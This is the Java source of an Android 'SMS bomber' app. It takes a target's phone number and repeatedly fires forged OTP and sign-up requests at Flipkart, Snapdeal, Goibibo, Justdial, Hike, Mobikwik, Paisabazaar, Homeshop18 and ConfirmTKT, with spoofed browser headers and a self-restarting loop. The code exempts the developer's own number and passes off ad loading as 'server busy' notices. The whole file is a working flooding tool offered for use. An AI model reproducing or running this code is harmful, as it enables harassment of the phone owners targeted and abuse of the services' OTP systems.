package co.deucate.smsbomber;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.text.Html;
import android.text.TextUtils;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeNoticeDialog;
import com.awesomedialog.blennersilva.awesomedialoglibrary.interfaces.Closure;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.ads.MobileAds;

import org.json.JSONObject;

import java.io.IOException;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


@SuppressWarnings("ALL")
public class HomeActivity extends AppCompatActivity {

    private static final String TAG = "HomeActivity";
    private static final int REQUEST_CONTACT_NUMBER = 32;
    String mPhoneNumber, mLog;
    EditText mPhoneEt;
    TextView mStatusTV, mLogTV;
    LinearLayout mPhoneLayout;
    AdRequest adRequest;

    private InterstitialAd interstitialAd;

    Thread mThread;

    int a;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (!isNetworkAvailable()) {
            addLog("#FF0000", "Please connect to network");
            return;
        }

        adRequest = new AdRequest.Builder().build();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (interstitialAd.isLoaded()) {
                    interstitialAd.show();
                    interstitialAd.loadAd(adRequest);
                } else {
                    addLog("#FFFF00", "Wait for 10-15 second.");
                    interstitialAd.loadAd(adRequest);
                }
            }
        }, 30000);

        new AwesomeNoticeDialog(this)
                .setTitle("Warning")
                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
                .setColoredCircle(R.color.dialogWarningBackgroundColor)
                .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
                .setCancelable(true)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setButtonBackgroundColor(R.color.dialogWarningBackgroundColor)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setNoticeButtonClick(new Closure() {
                    @Override
                    public void exec() {

                    }
                })
                .show();

        AdView adView = findViewById(R.id.mainBottomBannerAd);
        AdRequest adRequest1 = new AdRequest.Builder().build();
        adView.loadAd(adRequest1);

        AdView adView1 = findViewById(R.id.mainTopBannerAd);
        AdRequest adRequest2 = new AdRequest.Builder().build();
        adView.loadAd(adRequest2);

        MobileAds.initialize(this, "ca-app-pub-8086732239748075~8890173650");

        interstitialAd = new InterstitialAd(this);
        interstitialAd.setAdUnitId("ca-app-pub-8086732239748075/9598708915");
        interstitialAd.loadAd(new AdRequest.Builder().build());


        mPhoneEt = findViewById(R.id.mainPhoneEt);
        mPhoneLayout = findViewById(R.id.linearLayout);
        mStatusTV = findViewById(R.id.mainStatus);
        mLogTV = findViewById(R.id.logTV);

        mLog = mLogTV.getText().toString();

        findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mPhoneNumber = mPhoneEt.getText().toString();

                if (TextUtils.isEmpty(mPhoneNumber)) {
                    addLog("#FFFF00", "Please enter mobile number");
                    return;
                }


                if (!isNetworkAvailable()) {
                    addLog("#FF0000", "Please connect to network");
                    return;
                }

                if (interstitialAd.isLoaded()) {
                    interstitialAd.show();
                    interstitialAd.loadAd(adRequest);
                } else {
                    addLog("#FFFF33", "Please wait 10-15 second. Server is busy.");
                    interstitialAd.loadAd(adRequest);
                    return;
                }

                if (isDeveloperNumber(mPhoneNumber)) {
                    addLog("#FF0000", "Bombing on creator of this app does not make sense.");
                    return;
                }

                new Bomb().execute();

            }
        });

        findViewById(R.id.contactBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                if (!isNetworkAvailable()) {
                    addLog("#FF0000", "Please connect to network");
                    return;
                }

                Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
                startActivityForResult(intent, REQUEST_CONTACT_NUMBER);
            }
        });

        interstitialAd.setAdListener(new AdListener() {
            @Override
            public void onAdLoaded() {
                addLog("#FFFF33", "Server up");
            }

            @Override
            public void onAdFailedToLoad(int errorCode) {
                addLog("#FF0000", "Error : " + errorCode);
            }

            @Override
            public void onAdOpened() {
                // Code to be executed when the ad is displayed.

            }

            @Override
            public void onAdLeftApplication() {
                // Code to be executed when the user has left the app.
            }

            @Override
            public void onAdClosed() {
                interstitialAd.loadAd(adRequest);
            }
        });


    }

    private boolean isDeveloperNumber(String phoneNumber) {

        phoneNumber = phoneNumber.replace(" ", "");
        char[] number = phoneNumber.toCharArray();
        char[] myNumber = "9664769226".toCharArray();


        for (int i = 0; i < 10; i++) {
            if (number[i] != myNumber[i]) {
                return false;
            }
        }

        return true;
    }


    @SuppressLint("StaticFieldLeak")
    private class Bomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    confirmTKT();
                    mobikwick();
                    hike();
                    justdial();
                    piasabazar();
                    goibibo();
                    snapdeal();
                    homeshop18();
                    flipkart();

                }
            });
            mThread.start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new Bomb().execute();

        }
    }

    private void flipkart() {
        OkHttpClient localOkHttpClient = new OkHttpClient();
        RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91" + mPhoneNumber);
        localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                mStatusTV.setText("Flipkart");
            }
        });
    }

    private void homeshop18() {
        OkHttpClient localOkHttpClient1 = new OkHttpClient();
        RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "submit=submit&identity=" + mPhoneNumber + "&otpType=SIGNUP_OTP");
        localOkHttpClient1.newCall(new Request.Builder().url("https://mbe.homeshop18.com/services/secure/user/generate/otp").post(localRequestBody1).addHeader("x-hs18-app-version", "3.1.0").addHeader("x-hs18-app-id", "0").addHeader("x-hs18-device-version", "25").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("accept-charset", "UTF-8").addHeader("x-hs18-app-platform", "androidApp").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                mStatusTV.setText("Homeshop18");
            }
        });
    }

    private void snapdeal() {
        OkHttpClient localOkHttpClient2 = new OkHttpClient();
        RequestBody localRequestBody2 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "emailId=&mobileNumber=" + mPhoneNumber + "&purpose=LOGIN_WITH_MOBILE_OTP");
        localOkHttpClient2.newCall(new Request.Builder().url("https://www.snapdeal.com/sendOTP")
                .post(localRequestBody2).addHeader("host", "www.snapdeal.com")
                .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
                .addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5")
                .addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.snapdeal.com/iframeLogin")
                .addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest")
                .addHeader("content-length", "62").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                mStatusTV.setText("Snapdeal");
            }
        });
    }

    private void goibibo() {
        OkHttpClient localOkHttpClient3 = new OkHttpClient();
        RequestBody localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
        localOkHttpClient3.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        mStatusTV.setText("Goibibo");
                    }
                });
            }
        });
    }

    private void piasabazar() {
        OkHttpClient localOkHttpClient11 = new OkHttpClient();
        RequestBody localRequestBody11 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mobile_number=" + mPhoneNumber + "&step=send_password&request_page=landing");
        localOkHttpClient11.newCall(new Request.Builder().url("https://myaccount.paisabazaar.com/my-account/").post(localRequestBody11).addHeader("host", "myaccount.paisabazaar.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "application/json, text/javascript, */*; q=0.01").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://myaccount.paisabazaar.com/my-account/").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest").addHeader("content-length", "64").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                mStatusTV.setText("Paisabazar");
            }
        });
    }

    private void justdial() {
        String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
        new OkHttpClient().newCall(new Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        mStatusTV.setText("Justdial");
                    }
                });
            }
        });
    }

    private void hike() {
        MediaType localMediaType0 = MediaType.parse("application/json; charset=utf-8");
        HashMap localHashMap0 = new HashMap();
        localHashMap0.put("method", "pin");
        localHashMap0.put("msisdn", "+91".concat(mPhoneNumber));
        JSONObject localJSONObject121 = new JSONObject(localHashMap0);
        OkHttpClient localOkHttpClient121 = new OkHttpClient();
        RequestBody localRequestBody121 = RequestBody.create(localMediaType0, localJSONObject121.toString());
        localOkHttpClient121.newCall(new Request.Builder().url("http://api.im.hike.in/v3/account/validate?digits=4").post(localRequestBody121).addHeader("content-type", "application/json; charset=utf-8").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                mStatusTV.setText("Hike");
            }
        });
    }

    private void mobikwick() {
        MediaType localMediaType001 = MediaType.parse("application/json; charset=utf-8");
        HashMap localHashMap001 = new HashMap();
        localHashMap001.put("cell", mPhoneNumber);
        JSONObject localJSONObject001 = new JSONObject(localHashMap001);
        OkHttpClient localOkHttpClient001 = new OkHttpClient();
        RequestBody localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString());
        localOkHttpClient001.newCall(new Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                mStatusTV.setText("Mobikwik");
            }
        });
    }

    private void confirmTKT() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                WebView webView = new WebView(HomeActivity.this);
                webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                webView.setWebViewClient(new WebViewClient());
                mStatusTV.setText("ConfirmTKT");
            }
        });
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.overflow, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        switch (item.getItemId()) {
            case R.id.menuAbout: {
                addLog("#0000FF", "Created by Spidy0471");
                return true;
            }

            case R.id.menuWeb: {
                addLog("#00FF00", "Thank you for open my website. God bless you with 100 child.");
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://deucate.com/"));
                startActivity(intent);
                return true;
            }

            default: {
                return super.onOptionsItemSelected(item);
            }
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (resultCode == RESULT_OK && requestCode == REQUEST_CONTACT_NUMBER) {


            if (interstitialAd.isLoaded()) {
                interstitialAd.show();
                interstitialAd.loadAd(adRequest);

            } else {
                addLog("#FFFF00", "Wait for 10-15 second.");
                interstitialAd.loadAd(adRequest);
                return;
            }

            Uri uri = data.getData();
            @SuppressLint("Recycle")
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            assert cursor != null;
            cursor.moveToFirst();
            int colum = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String numberT = cursor.getString(colum);
            String number = "";
            if (numberT.contains("+")) {
                numberT = numberT.substring(3);
                number = numberT.replaceAll(" ", "");
                mPhoneNumber = number;
                mPhoneEt.setText(number);
            } else {
                number = numberT.replaceAll(" ", "");
                mPhoneNumber = number;
                mPhoneEt.setText(mPhoneNumber);
            }

            if (isDeveloperNumber(mPhoneNumber)) {
                addLog("#FF0000", "Bombing on creator of this app dosen't make sence. :(");
                return;
            }
            mPhoneNumber = numberT;
            mPhoneEt.setText(numberT);
            new Bomb().execute();

        }

    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    private void addLog(String color, String log) {
        String newLog = "<font color='" + color + "'>" + log + "</font>";
        mLog += "<br/>> " + newLog;
        mLogTV.setText(Html.fromHtml(mLog));
    }

}
